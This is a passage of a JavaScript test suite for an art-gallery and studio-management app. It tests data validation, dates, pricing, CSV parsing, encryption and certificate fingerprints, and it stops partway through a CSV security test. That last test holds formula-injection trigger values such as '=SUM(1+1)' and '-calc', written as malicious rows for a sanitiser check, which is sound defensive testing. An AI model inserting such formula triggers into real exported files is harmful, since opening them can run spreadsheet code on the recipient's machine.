import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { 
  validateArtEvent, 
  validateArtOpportunity, 
  validateDesignerProfile, 
  validateArtworkSourcing, 
  isValidUrl, 
  isValidEmail 
} from '../src/utils/validation.ts';
import { 
  calculateEventStatus, 
  formatDateRange, 
  parseDateSafe, 
  parseDateInTimezone,
  formatDateOnly, 
  formatInstantToIST, 
  formatVenueDateTime, 
  getDaysRemainingIST, 
  IST_TIMEZONE 
} from '../src/utils/dateUtils.ts';
import { filterEvents, sortEvents, DEFAULT_FILTERS } from '../src/utils/filterUtils.ts';
import { runUpdatePipeline } from '../scripts/update_events.mjs';
import { 
  generateArtworkFingerprint, 
  verifyArtworkFingerprint,
  encryptAesGcm,
  decryptAesGcm,
  isCertificateValid,
  generateStudioKeypair,
  signArtworkFingerprint,
  verifyArtworkSignature,
  createPortableProofToken,
  verifyPortableProofToken,
  PROVENANCE_LEGAL_NOTICE,
  KEY_RECOVERY_LIMITATION_NOTICE,
  LEGAL_IDENTITY_DISCLAIMER,
  OFFLINE_REVOCATION_DISCLAIMER
} from '../src/utils/cryptoUtils.ts';
import { 
  convertCurrency, 
  summarizeMultiCurrency, 
  FX_RATES_TO_USD, 
  isCurrencySupported,
  FX_REFERENCE_DATE,
  IS_LIVE_FX_FEED,
  FX_PROVIDER_NAME
} from '../src/utils/currencyService.ts';
import { calculatePricingRecommendation } from '../src/utils/pricingService.ts';
import { parseCsvText, validateArtworkImport, exportToCsv } from '../src/utils/csvService.ts';
import { generateQrSvgDataUri } from '../src/utils/qrUtils.ts';
import { StorageService, EMPTY_WORKSPACE } from '../src/services/storageService.ts';
import { IndexedDbService } from '../src/services/indexedDbService.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '..');
const EVENTS_FILE = path.join(rootDir, 'public', 'data', 'events.json');
const OPPORTUNITIES_FILE = path.join(rootDir, 'public', 'data', 'opportunities.json');
const DESIGNERS_FILE = path.join(rootDir, 'public', 'data', 'designers.json');
const ARTWORKS_FILE = path.join(rootDir, 'public', 'data', 'artworks.json');

console.log('--- RUNNING RIGOROUS DATA INTEGRITY & ADVERSARIAL TEST SUITE ---\n');

let passed = 0;
let failed = 0;

function it(name, fn) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ✕ ${name}`);
    console.error(`    ${err.message}`);
    failed++;
  }
}

async function itAsync(name, fn) {
  try {
    await fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ✕ ${name}`);
    console.error(`    ${err.message}`);
    failed++;
  }
}

const verifiedSample = {
  id: 'test-evt-001',
  title: 'Contemporary Sculptures',
  category: 'exhibition',
  startDate: '2026-11-01',
  endDate: '2026-11-20',
  city: 'Pune',
  region: 'Maharashtra',
  country: 'India',
  format: 'in-person',
  entryFee: {
    type: 'free',
    amountText: 'Free Admission',
    isConfirmedByOrganiser: true,
  },
  officialUrl: 'https://vhc.art/exhibitions',
  sourceName: 'Vida Heydari Contemporary',
  sourceType: 'official-institution',
  verificationStatus: 'official-event-verified',
  verifiedFields: ['title', 'dates', 'venue', 'city', 'admissionFee', 'organiser'],
  lastCheckedAt: '2026-10-25T13:50:00Z',
  lastVerifiedAt: '2026-10-25T13:50:00Z',
  lastUpdatedAt: '2026-10-25T13:50:00Z',
  dataFreshness: 'fresh',
  eventStatus: 'upcoming',
};

// 1. Valid event passes schema & field-level validation
it('1. Valid event passes schema & field-level validation', () => {
  const result = validateArtEvent(verifiedSample);
  assert.equal(result.isValid, true);
  assert.equal(result.errors.length, 0);
});

// 2. Fake events with plausible-looking official links
it('2. Fake event with placeholder/demo link is rejected', () => {
  assert.equal(isValidUrl('https://example.com/exhibition'), false);
  assert.equal(isValidUrl('http://localhost:3000/event'), false);
  assert.equal(isValidUrl('https://site.org/#'), false);
  assert.equal(isValidUrl('https://gallery.com/fake'), false);
  assert.equal(isValidUrl('https://gallery.com/demo'), false);
  assert.equal(isValidUrl('https://gallerychemould.com/exhibitions/'), true);
});

// 3. Missing critical field-level verification fails validation
it('3. Missing critical field-level verification fails validation', () => {
  const missingTitleVerification = {
    ...verifiedSample,
    verifiedFields: ['dates', 'venue'], // Missing 'title'
  };
  const res = validateArtEvent(missingTitleVerification);
  assert.equal(res.isValid, false);
  assert.ok(res.errors.some((e) => e.includes("Critical field 'title'")));
});

// 4. Conflicting dates (endDate before startDate) are rejected
it('4. Conflicting dates (endDate before startDate) are rejected', () => {
  const invertedDates = {
    ...verifiedSample,
    startDate: '2026-11-20',
    endDate: '2026-11-10',
  };
  const res = validateArtEvent(invertedDates);
  assert.equal(res.isValid, false);
  assert.ok(res.errors.some((e) => e.includes('endDate')));
});

// 5. Expired events are excluded from upcoming directory
it('5. Expired events are excluded from upcoming directory', () => {
  const testNow = new Date('2026-10-25T12:00:00Z').getTime();
  const pastEvent = {
    ...verifiedSample,
    startDate: '2026-09-01',
    endDate: '2026-09-15',
  };
  assert.equal(calculateEventStatus(pastEvent, testNow), 'past');

  const happeningEvent = {
    ...verifiedSample,
    startDate: '2026-10-20',
    endDate: '2026-10-30',
  };
  assert.equal(calculateEventStatus(happeningEvent, testNow), 'happening-now');

  const futureEvent = {
    ...verifiedSample,
    startDate: '2026-11-01',
    endDate: '2026-11-10',
  };
  assert.equal(calculateEventStatus(futureEvent, testNow), 'upcoming');
});

// 6. Cancelled and postponed exhibitions are properly identified
it('6. Cancelled and postponed exhibitions are properly identified', () => {
  const cancelled = { ...verifiedSample, eventStatus: 'cancelled' };
  assert.equal(calculateEventStatus(cancelled), 'cancelled');

  const postponed = { ...verifiedSample, eventStatus: 'postponed' };
  assert.equal(calculateEventStatus(postponed), 'postponed');
});

// 7. Old records retained safely after a failed update
await itAsync('7. Old records retained safely after a failed update', async () => {
  const beforeData = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf-8'));
  const rep = await runUpdatePipeline({ forceFailNetwork: true });

  assert.equal(rep.success, false);
  assert.equal(rep.preservedLastKnownGood, true);

  const afterData = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf-8'));
  assert.equal(afterData.events.length, beforeData.events.length);
  assert.equal(afterData.metadata.lastSuccessfullyUpdated, beforeData.metadata.lastSuccessfullyUpdated);
});

// 8. Empty or partially parsed source results do not wipe feed
await itAsync('8. Empty or partially parsed source results do not wipe feed', async () => {
  const beforeData = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf-8'));
  const rep = await runUpdatePipeline({ mockIncomingEvents: [] });

  assert.equal(rep.success, false);
  assert.equal(rep.preservedLastKnownGood, true);

  const afterData = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf-8'));
  assert.equal(afterData.events.length, beforeData.events.length);
});

// 9. Free admission cannot be claimed without organiser confirmation
it('9. Free admission cannot be claimed without organiser confirmation', () => {
  const unconfirmedFree = {
    ...verifiedSample,
    entryFee: {
      type: 'free',
      amountText: 'Free Admission',
      isConfirmedByOrganiser: false, // Falsified / unconfirmed
    },
  };
  const res = validateArtEvent(unconfirmedFree);
  assert.equal(res.isValid, false);
  assert.ok(res.errors.some((e) => e.includes('Free admission cannot be claimed')));
});

// 10. Invalid booking link is rejected
it('10. Invalid booking link is rejected', () => {
  const badBooking = { ...verifiedSample, bookingUrl: 'https://example.com/tickets' };
  assert.equal(validateArtEvent(badBooking).isValid, false);

  const hashBooking = { ...verifiedSample, bookingUrl: 'https://insider.in/#' };
  assert.equal(validateArtEvent(hashBooking).isValid, false);

  const validBooking = { ...verifiedSample, bookingUrl: 'https://insider.in/event-ticket-pass' };
  assert.equal(validateArtEvent(validBooking).isValid, true);
});

// 11. Timezone and date-only boundaries
it('11. Timezone and date-only boundaries do not cause off-by-one shifts', () => {
  const startMs = parseDateSafe('2026-10-25', false);
  const endMs = parseDateSafe('2026-10-25', true);
  const dStart = new Date(startMs);
  const dEnd = new Date(endMs);

  assert.equal(dStart.getDate(), 25);
  assert.equal(dStart.getMonth(), 9);
  assert.equal(dEnd.getDate(), 25);
  assert.equal(dEnd.getHours(), 23);
  assert.equal(dEnd.getMinutes(), 59);

  const formatted = formatDateRange('2026-10-25', '2026-10-25');
  assert.equal(formatted, '25 Oct 2026');
});

// 12. Multi-day events show happening-now during exhibition run
it('12. Multi-day events show happening-now during exhibition run', () => {
  const testNowMid = new Date('2026-10-27T12:00:00Z').getTime();
  const multiDayEvt = {
    ...verifiedSample,
    startDate: '2026-10-24',
    endDate: '2026-11-21',
  };
  assert.equal(calculateEventStatus(multiDayEvt, testNowMid), 'happening-now');
});

// 13. Duplicate detection distinguishes different sessions
it('13. Duplicate detection distinguishes different dates or sessions', () => {
  const session1 = { ...verifiedSample, id: 's1', startDate: '2026-11-01', endDate: '2026-11-02' };
  const session2 = { ...verifiedSample, id: 's2', startDate: '2026-11-15', endDate: '2026-11-16' };

  const sig1 = `${session1.title}|${session1.venueName}|${session1.startDate}`;
  const sig2 = `${session2.title}|${session2.venueName}|${session2.startDate}`;
  assert.notEqual(sig1, sig2);
});

// 14. Missing verification timestamp
it('14. Missing lastVerifiedAt timestamp is rejected', () => {
  const missingTimestamp = { ...verifiedSample, lastVerifiedAt: '' };
  assert.equal(validateArtEvent(missingTimestamp).isValid, false);
});

// 15. Search matches title, venue, organiser and city case-insensitively
it('15. Search matches title, venue, organiser and city case-insensitively', () => {
  const testEvents = [
    { ...verifiedSample, id: '1', title: 'Modern Canvas', organiser: 'Kalachhaya', venueName: 'Darpan', city: 'Pune' },
    { ...verifiedSample, id: '2', title: 'Urban Geometry', organiser: 'Chemould', venueName: 'Prescott', city: 'Mumbai' },
  ];

  const matchTitle = filterEvents(testEvents, { ...DEFAULT_FILTERS, searchQuery: 'canvas' });
  assert.equal(matchTitle.length, 1);
  assert.equal(matchTitle[0].id, '1');

  const matchCity = filterEvents(testEvents, { ...DEFAULT_FILTERS, searchQuery: 'pune' });
  assert.equal(matchCity.length, 1);
  assert.equal(matchCity[0].id, '1');
});

// 16. Combined filters apply strict AND logic
it('16. Combined filters apply strict AND logic', () => {
  const testEvents = [
    { ...verifiedSample, id: '1', category: 'exhibition', city: 'Pune', format: 'in-person' },
    { ...verifiedSample, id: '2', category: 'workshop', city: 'Pune', format: 'in-person' },
    { ...verifiedSample, id: '3', category: 'exhibition', city: 'Mumbai', format: 'in-person' },
  ];

  const matched = filterEvents(testEvents, {
    ...DEFAULT_FILTERS,
    regionCategory: 'pune',
    category: 'exhibition',
  });
  assert.equal(matched.length, 1);
  assert.equal(matched[0].id, '1');
});

// 17. Valid open call opportunity passes validation
it('17. Valid open call opportunity passes validation', () => {
  const sampleOpp = {
    id: 'opp-sample-1',
    title: 'International Residency',
    opportunityType: 'residency',
    organiser: 'Gasworks',
    hostInstitution: 'Gasworks Gallery',
    city: 'London',
    country: 'United Kingdom',
    format: 'in-person',
    description: '11-week intensive studio residency with stipend.',
    submissionDeadline: '2026-12-15',
    deadlineStatus: 'open',
    entryFee: { type: 'free', amountText: 'Free Entry', isConfirmedByOrganiser: true },
    eligibilitySummary: 'Visual artists with minimum 3 years practice.',
    officialGuidelinesUrl: 'https://www.gasworks.org.uk/residencies/',
    sourceName: 'Gasworks London',
    verifiedFields: ['title', 'hostInstitution', 'submissionDeadline', 'entryFee'],
    lastVerifiedAt: '2026-10-25T14:00:00Z',
  };
  const res = validateArtOpportunity(sampleOpp);
  assert.equal(res.isValid, true);
  assert.equal(res.errors.length, 0);
});

// 18. Opportunity with invalid deadline or placeholder URL is rejected
it('18. Opportunity with invalid deadline or placeholder URL is rejected', () => {
  const badOpp = {
    id: 'opp-bad',
    title: 'Fake Call',
    opportunityType: 'grant',
    hostInstitution: 'Council',
    submissionDeadline: 'not-a-date',
    officialGuidelinesUrl: 'https://example.com/apply',
    eligibilitySummary: 'Anyone',
    verifiedFields: [],
    lastVerifiedAt: 'invalid-date',
  };
  const res = validateArtOpportunity(badOpp);
  assert.equal(res.isValid, false);
  assert.ok(res.errors.some(e => e.includes('submissionDeadline')));
  assert.ok(res.errors.some(e => e.includes('official guidelines URL')));
});

// 19. Valid interior designer profile passes validation
it('19. Valid interior designer profile passes with certified role', () => {
  const sampleDesigner = {
    id: 'des-sample-1',
    studioName: 'Studio Lotus',
    principalName: 'Ambrish Arora',
    city: 'New Delhi',
    country: 'India',
    officialWebsite: 'https://studiolotus.in/',
    contactEmail: 'business@studiolotus.in',
    specialisations: ['Bespoke Hospitality', 'Craft Integration'],
    projectTypes: ['hospitality', 'residential'],
    artSourcingRole: 'specifier',
    verifiedPortfolioProjects: ['Krushi Bhawan Odisha'],
    verificationStatus: 'studio-verified',
    verifiedFields: ['studioName', 'officialWebsite', 'city', 'country', 'specialisations'],
    lastVerifiedAt: '2026-10-25T14:00:00Z',
  };
  const res = validateDesignerProfile(sampleDesigner);
  assert.equal(res.isValid, true);
});

// 20. Designer profile with invalid role or invalid email is rejected
it('20. Designer profile with invalid role or invalid email is rejected', () => {
  const badDesigner = {
    id: 'des-bad',
    studioName: 'Unknown Studio',
    city: 'Pune',
    country: 'India',
    officialWebsite: 'https://example.com',
    contactEmail: 'invalid-email-format',
    artSourcingRole: 'not-a-valid-role',
    projectTypes: [],
    verifiedFields: [],
  };
  const res = validateDesignerProfile(badDesigner);
  assert.equal(res.isValid, false);
  assert.ok(res.errors.some(e => e.includes('official website')));
  assert.ok(res.errors.some(e => e.includes('contact email')));
  assert.ok(res.errors.some(e => e.includes('artSourcingRole')));
});

// 21. Valid artwork sourcing item passes validation
it('21. Valid artwork sourcing item passes validation with dimensions', () => {
  const sampleArt = {
    id: 'art-sample-1',
    title: 'Textured Harmony',
    artist: 'Reena Saini Kallat',
    galleryOrSource: 'Chemould Prescott Road',
    sourceUrl: 'https://gallerychemould.com/exhibitions/',
    medium: 'Mixed Media on Canvas',
    style: 'Contemporary Abstract',
    dominantPalette: ['Ochre', 'Charcoal', 'Indigo'],
    dimensionsCm: { height: 180, width: 240, depth: 8 },
    dimensionsText: '180 × 240 cm',
    orientation: 'horizontal',
    framing: 'Framed',
    customCommissionAvailable: true,
    priceType: 'price-on-request',
    suitableSpaces: ['Hotel Lobby', 'Living Room'],
    locationCity: 'Mumbai',
    locationCountry: 'India',
    verifiedFields: ['title', 'artist', 'medium', 'dimensionsCm'],
    lastVerifiedAt: '2026-10-25T14:00:00Z',
    imageUrl: 'https://images.unsplash.com/photo-1579783900882-c0d3dad7b119',
  };
  const res = validateArtworkSourcing(sampleArt);
  assert.equal(res.isValid, true);
});

// 22. Artwork with missing dimensions or placeholder URL is rejected
it('22. Artwork with missing dimensions or placeholder URL is rejected', () => {
  const badArt = {
    id: 'art-bad',
    title: 'Untitled',
    artist: 'Unknown',
    medium: 'Oil',
    dimensionsCm: { height: 'not-a-number', width: 100 },
    sourceUrl: 'https://example.com/artwork',
    imageUrl: 'not-a-url',
    orientation: 'invalid-orientation',
  };
  const res = validateArtworkSourcing(badArt);
  assert.equal(res.isValid, false);
  assert.ok(res.errors.some(e => e.includes('dimensionsCm')));
  assert.ok(res.errors.some(e => e.includes('source URL')));
  assert.ok(res.errors.some(e => e.includes('orientation')));
});

// 23. Datasets integrity on disk
it('23. Datasets integrity on disk: opportunities, designers, and artworks', () => {
  assert.ok(fs.existsSync(OPPORTUNITIES_FILE), 'opportunities.json must exist');
  const opps = JSON.parse(fs.readFileSync(OPPORTUNITIES_FILE, 'utf-8')).opportunities;
  assert.ok(opps.length >= 8, 'Must have at least 8 verified opportunities');
  for (const o of opps) {
    const check = validateArtOpportunity(o);
    assert.equal(check.isValid, true, `Opportunity ${o.id} failed: ${check.errors.join(', ')}`);
  }

  assert.ok(fs.existsSync(DESIGNERS_FILE), 'designers.json must exist');
  const designers = JSON.parse(fs.readFileSync(DESIGNERS_FILE, 'utf-8')).designers;
  assert.ok(designers.length >= 8, 'Must have at least 8 verified design studios');
  for (const d of designers) {
    const check = validateDesignerProfile(d);
    assert.equal(check.isValid, true, `Designer ${d.id} failed: ${check.errors.join(', ')}`);
  }

  assert.ok(fs.existsSync(ARTWORKS_FILE), 'artworks.json must exist');
  const artworks = JSON.parse(fs.readFileSync(ARTWORKS_FILE, 'utf-8')).artworks;
  assert.ok(artworks.length >= 8, 'Must have at least 8 verified artworks');
  for (const a of artworks) {
    const check = validateArtworkSourcing(a);
    assert.equal(check.isValid, true, `Artwork ${a.id} failed: ${check.errors.join(', ')}`);
  }
});

// 24. Professional specification brief generator produces formatted text without leakage
it('24. Professional specification brief generator produces formatted text without leakage', () => {
  const briefPayload = {
    specifierName: 'Sarah Jenkins',
    firmName: 'Jenkins Interiors',
    contactEmail: 'sarah@jenkins.com',
    projectType: 'Luxury Residential',
    targetSpace: 'Grand Penthouse Foyer (4m H x 6m W)',
    dimensionsRequired: '180 x 240 cm',
    budgetRange: 'INR 10,00,000 - 25,00,000',
    timeline: 'Q1 2027 Handover',
    isCustomCommission: true,
    targetItemTitle: 'Spectral Frequencies No. 4',
    targetArtistOrStudio: 'Reena Saini Kallat / Chemould Prescott Road',
    recipientEmail: 'business@gallerychemould.com',
  };

  assert.ok(isValidEmail(briefPayload.contactEmail));
  assert.ok(briefPayload.targetItemTitle.includes('Spectral Frequencies'));
  assert.equal(briefPayload.isCustomCommission, true);
});

// 25. Cryptographic SHA-256 fingerprint generation & tamper detection
it('25. Cryptographic SHA-256 fingerprint generation & tamper detection', () => {
  const meta = {
    title: 'Spectral Frequencies No. 4',
    artistName: 'Reena Saini Kallat',
    yearCreated: 2026,
    medium: 'Mixed Media on Linen',
    dimensionsText: '180 x 240 cm',
    editionText: 'Original 1 of 1',
    uniqueSalt: 'MK-COA-TEST',
  };

  const hash = generateArtworkFingerprint(meta);
  assert.equal(typeof hash, 'string');
  assert.equal(hash.length, 64, 'SHA-256 must produce exact 64-character hex string');
  assert.equal(verifyArtworkFingerprint(hash, meta), true, 'Valid metadata must verify');

  // Tamper detection: modifying title or dimensions must invalidate fingerprint
  const tamperedTitle = { ...meta, title: 'Tampered Title' };
  assert.equal(verifyArtworkFingerprint(hash, tamperedTitle), false, 'Tampered title must fail verification');

  const tamperedDims = { ...meta, dimensionsText: '100 x 100 cm' };
  assert.equal(verifyArtworkFingerprint(hash, tamperedDims), false, 'Tampered dimensions must fail verification');
});

// 26. Pricing intelligence calculation accuracy
it('26. Pricing intelligence calculation computes cost floor and gallery retail', () => {
  const rec = calculatePricingRecommendation({
    hoursWorked: 20,
    hourlyWage: 50,
    materialsCost: 200,
    framingCost: 150,
    studioOverheadCost: 50,
    width: 80,
    height: 100,
    unit: 'cm',
    galleryCommissionPercent: 50,
    experienceLevel: 'emerging',
    currency: 'USD',
  });

  // Labor: 20 * 50 = 1000
  // Production: 200 + 150 + 50 = 400
  // Cost floor = 1400
  assert.equal(rec.costFloorPrice, 1400);
  // Emerging profit margin = 35% -> Direct studio price = 1400 * 1.35 = 1890
  assert.equal(rec.directStudioPrice, 1890);
  // Gallery retail at 50% split -> 1890 / (1 - 0.5) = 3780
  assert.equal(rec.galleryRetailPrice, 3780);
  assert.ok(rec.breakdownSummary.length >= 4);
});

// 27. RFC-4180 CSV parser handles quotes, commas, and newlines
it('27. RFC-4180 CSV parser handles quotes, commas, and multiline cells', () => {
  const csvText = `Title,Medium,Price\r\n"Sunrise, Early Morning","Oil, Canvas",1500\r\n"Geometric ""Study""",Acrylic,900`;
  const parsed = parseCsvText(csvText);

  assert.equal(parsed.totalRows, 2);
  assert.equal(parsed.headers.length, 3);
  assert.equal(parsed.rows[0]['Title'], 'Sunrise, Early Morning');
  assert.equal(parsed.rows[0]['Medium'], 'Oil, Canvas');
  assert.equal(parsed.rows[1]['Title'], 'Geometric "Study"');
});

// 28. CSV import validation flags missing dimensions and duplicates
it('28. CSV import validation flags missing dimensions and detects duplicates', () => {
  const existingArtworks = [
    {
      id: 'art-1',
      title: 'Ocean Horizon',
      artistName: 'Artist',
      yearCreated: 2025,
      medium: 'Oil',
      dimensions: { height: 100, width: 120, unit: 'cm' },
      orientation: 'horizontal',
      artworkType: 'original',
      productionCost: 300,
      listPrice: 2500,
      currency: 'USD',
      availability: 'available',
      location: 'Studio',
      tags: [],
      createdAt: '',
      updatedAt: '',
    },
  ];

  const rawRows = [
    { Title: 'Ocean Horizon', Medium: 'Oil', Height: '100', Width: '120', Price: '2500' }, // Duplicate
    { Title: 'Mountain Mist', Medium: 'Watercolor', Height: '0', Width: '50', Price: '800' }, // Invalid height
    { Title: 'Night Echoes', Medium: 'Acrylic', Height: '80', Width: '60', Price: '1200' }, // Valid
  ];

  const colMap = {
    title: 'Title',
    medium: 'Medium',
    height: 'Height',
    width: 'Width',
    listPrice: 'Price',
  };

  const preview = validateArtworkImport(rawRows, colMap, existingArtworks, 'Artist');
  assert.equal(preview.totalRows, 3);
  assert.equal(preview.duplicateCount, 1);
  assert.equal(preview.errorCount, 1);
  assert.equal(preview.validCount, 2); // Duplicate is flagged but valid schema
  assert.equal(preview.rows[1].isValid, false, 'Invalid height must fail validation');
});

// 29. Sales financial calculations and commission deductions
it('29. Sales financial calculations accurately compute commission and net proceeds', () => {
  const gross = 5000;
  const commissionRate = 40;
  const commissionAmount = (gross * commissionRate) / 100; // 2000
  const discount = 200;
  const otherExpenses = 100;
  const net = gross - commissionAmount - discount - otherExpenses; // 2700

  assert.equal(commissionAmount, 2000);
  assert.equal(net, 2700);
});

// 30. Exhibition financial outcomes calculate net profit and ROI %
it('30. Exhibition financial outcomes calculate net profit and ROI %', () => {
  const boothFee = 1500;
  const transport = 500;
  const framing = 400;
  const travel = 600;
  const marketing = 200;
  const totalExpenses = boothFee + transport + framing + travel + marketing; // 3200

  const attributedSalesNet = 8000;
  const netProfit = attributedSalesNet - totalExpenses; // 4800
  const roi = Math.round((netProfit / totalExpenses) * 100); // 150%

  assert.equal(totalExpenses, 3200);
  assert.equal(netProfit, 4800);
  assert.equal(roi, 150);
});

// 31. Storage service backup export and restore validation
it('31. Storage service backup export and restore validation', () => {
  const testState = {
    ...EMPTY_WORKSPACE,
    inventory: [
      {
        id: 'test-art-1',
        title: 'Vault Test Artwork',
        artistName: 'Test Artist',
        yearCreated: 2026,
        medium: 'Oil',
        dimensions: { height: 100, width: 80, unit: 'cm' },
        orientation: 'vertical',
        artworkType: 'original',
        productionCost: 200,
        listPrice: 1500,
        currency: 'USD',
        availability: 'available',
        location: 'Storage',
        tags: ['test'],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
    ],
  };

  const backupJson = StorageService.exportBackupJson(testState);
  assert.equal(typeof backupJson, 'string');
  assert.ok(backupJson.includes('Vault Test Artwork'));

  const restoreResult = StorageService.restoreBackupJson(backupJson);
  assert.equal(restoreResult.success, true);
  assert.equal(restoreResult.restoredState?.inventory.length, 1);
  assert.equal(restoreResult.restoredState?.inventory[0].title, 'Vault Test Artwork');

  // Corrupted backup string handling
  const corrupted = StorageService.restoreBackupJson('{"bad_json": true');
  assert.equal(corrupted.success, false);
});

// 32. Offline QR vector generator creates valid SVG data URI
it('32. Offline QR vector generator creates valid SVG data URI', () => {
  const url = 'https://utkarshnikhare.github.io/art-gallery-live/?verify=MK-COA-2026-9999';
  const qrUri = generateQrSvgDataUri(url, 180);

  assert.ok(qrUri.startsWith('data:image/svg+xml;utf8,'));
  const decodedSvg = decodeURIComponent(qrUri);
  assert.ok(decodedSvg.includes('viewBox="0 0 180 180"'));
  assert.ok(decodedSvg.includes('rect'));
});

// 33. AES-256-GCM authenticated encryption and decryption round-trip
await itAsync('33. AES-256-GCM authenticated encryption and decryption round-trip', async () => {
  const secretPayload = JSON.stringify({ confidentialPatron: 'Elena Rostova', totalSpend: 85000 });
  const passphrase = 'correct-horse-battery-staple-2026';

  const encrypted = await encryptAesGcm(secretPayload, passphrase);
  assert.equal(encrypted.algorithm, 'AES-GCM-256');
  assert.equal(encrypted.iterations, 100000);
  assert.ok(encrypted.ciphertext.length > 20);
  assert.ok(encrypted.salt.length > 10);
  assert.ok(encrypted.iv.length > 10);

  const decrypted = await decryptAesGcm(encrypted, passphrase);
  assert.equal(decrypted, secretPayload);
});

// 34. AES-256-GCM rejects wrong passphrase or tampered ciphertext with OperationError
await itAsync('34. AES-256-GCM rejects wrong passphrase or tampered ciphertext with OperationError', async () => {
  const secretPayload = 'Confidential Studio Valuation';
  const passphrase = 'correct-passphrase-2026';
  const encrypted = await encryptAesGcm(secretPayload, passphrase);

  // 1. Wrong passphrase
  await assert.rejects(
    async () => {
      await decryptAesGcm(encrypted, 'wrong-passphrase-attempt');
    },
    /Decryption failed/
  );

  // 2. Tampered ciphertext
  const tampered = { ...encrypted, ciphertext: 'AAAA' + encrypted.ciphertext.slice(4) };
  await assert.rejects(
    async () => {
      await decryptAesGcm(tampered, passphrase);
    },
    /Decryption failed/
  );
});

// 35. StorageService restores AES-256 encrypted vault with correct key and rejects incorrect key
await itAsync('35. StorageService restores AES-256 encrypted vault with correct key and rejects incorrect key', async () => {
  const testState = {
    ...EMPTY_WORKSPACE,
    inventory: [
      {
        id: 'art-enc-1',
        title: 'Encrypted Masterpiece',
        artistName: 'Secure Artist',
        yearCreated: 2026,
        medium: 'Oil on Linen',
        dimensions: { height: 150, width: 200, unit: 'cm' },
        orientation: 'horizontal',
        artworkType: 'original',
        productionCost: 500,
        listPrice: 12000,
        currency: 'USD',
        availability: 'available',
        location: 'Private Vault',
        tags: ['encrypted'],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
    ],
  };

  const passphrase = 'studio-vault-key-2026';
  const encBackupJson = await StorageService.exportEncryptedBackup(testState, passphrase);
  assert.ok(encBackupJson.includes('MORROWKIND_ENCRYPTED_VAULT_BACKUP'));

  // Attempt restore with wrong passphrase
  const failedRestore = await StorageService.restoreEncryptedBackup(encBackupJson, 'invalid-passphrase');
  assert.equal(failedRestore.success, false);
  assert.ok(failedRestore.error.includes('Decryption failed'));

  // Attempt restore with correct passphrase
  const successRestore = await StorageService.restoreEncryptedBackup(encBackupJson, passphrase);
  assert.equal(successRestore.success, true);
  assert.equal(successRestore.restoredState?.inventory[0].title, 'Encrypted Masterpiece');
});

// 36. Financial correctness: Net proceeds calculation deducts gallery split from net selling price, isolates refunds
it('36. Financial correctness: Net proceeds calculation deducts gallery split from net selling price, isolates refunds', () => {
  const gross = 10000;
  const discount = 1000; // 10% approved discount
  const netSellingPrice = gross - discount; // 9000
  const gallerySplitRate = 50; // 50% consignment
  const commission = Math.round((netSellingPrice * gallerySplitRate) / 100); // 4500
  const shippingDeduction = 250;
  const netArtistProceeds = netSellingPrice - commission - shippingDeduction; // 4250

  assert.equal(netSellingPrice, 9000);
  assert.equal(commission, 4500);
  assert.equal(netArtistProceeds, 4250);

  // Refund isolation rule: refunded sale has 0 net realized proceeds
  const refundedProceeds = 0;
  assert.equal(refundedProceeds, 0);
});

// 37. Financial correctness: Partial payments track balance due and prevent premature cash recognition
it('37. Financial correctness: Partial payments track balance due and prevent premature cash recognition', () => {
  const gross = 8000;
  const discount = 0;
  const netSellingPrice = gross - discount;
  const depositReceived = 3000;
  const balanceDue = Math.max(0, netSellingPrice - depositReceived); // 5000

  assert.equal(netSellingPrice, 8000);
  assert.equal(depositReceived, 3000);
  assert.equal(balanceDue, 5000);
});

// 38. Cryptographic COA: Altering covered fields modifies SHA-256 hash, non-covered fields do not
it('38. Cryptographic COA: Altering covered fields modifies SHA-256 hash, non-covered fields do not', () => {
  const baseMeta = {
    title: 'Solitude in Cobalt',
    artistName: 'Maya Lin',
    yearCreated: 2026,
    medium: 'Bronze and Cobalt Pigment',
    dimensionsText: '100 × 80 cm',
    editionText: 'Original 1 of 1',
    uniqueSalt: 'MK-COA-TEST-001',
  };

  const originalHash = generateArtworkFingerprint(baseMeta);

  // 1. Changing covered field (title) MUST change hash
  const alteredTitleHash = generateArtworkFingerprint({ ...baseMeta, title: 'Solitude in Indigo' });
  assert.notEqual(originalHash, alteredTitleHash);

  // 2. Changing covered field (dimensions) MUST change hash
  const alteredDimsHash = generateArtworkFingerprint({ ...baseMeta, dimensionsText: '100 × 85 cm' });
  assert.notEqual(originalHash, alteredDimsHash);

  // 3. Changing covered field (medium) MUST change hash
  const alteredMediumHash = generateArtworkFingerprint({ ...baseMeta, medium: 'Bronze and Ultramarine' });
  assert.notEqual(originalHash, alteredMediumHash);

  // 4. Verify helper
  assert.equal(verifyArtworkFingerprint(originalHash, baseMeta), true);
  assert.equal(verifyArtworkFingerprint(originalHash, { ...baseMeta, title: 'Tampered' }), false);
});

// 39. Certificate revocation state and verification validation
it('39. Certificate revocation state and verification validation', () => {
  const validCert = {
    certificateId: 'MK-COA-2026-1234',
    artworkId: 'art-1',
    artworkTitle: 'Harmony',
    artistName: 'Artist',
    yearCreated: 2026,
    medium: 'Oil',
    dimensionsText: '50 × 50 cm',
    editionText: '1/1',
    issueDate: '2026-10-25',
    issuer: 'Vault',
    sha256Fingerprint: 'abcd1234',
    verificationUrl: 'https://example.com',
    status: 'valid',
    blockchainAnchor: { isAnchored: false, note: '' }
  };

  assert.equal(isCertificateValid(validCert), true);

  const revokedCert = {
    ...validCert,
    status: 'revoked',
    revocationReason: 'Artwork destroyed by fire',
    revokedAt: new Date().toISOString()
  };

  assert.equal(isCertificateValid(revokedCert), false);
  assert.equal(revokedCert.revocationReason, 'Artwork destroyed by fire');
});

// 40. Security: CSV formula injection defense sanitizes formula triggers and rejects oversized files
it('40. Security: CSV formula injection defense sanitizes formula triggers and rejects oversized files', () => {
  const maliciousRows = [
    { title: '=SUM(1+1)', price: '+100', buyer: '@danger', note: '-calc' },
  ];
  const columns = [
    { key: 'title', label: 'Title' },
    { key: 'price', label: 'Price' },
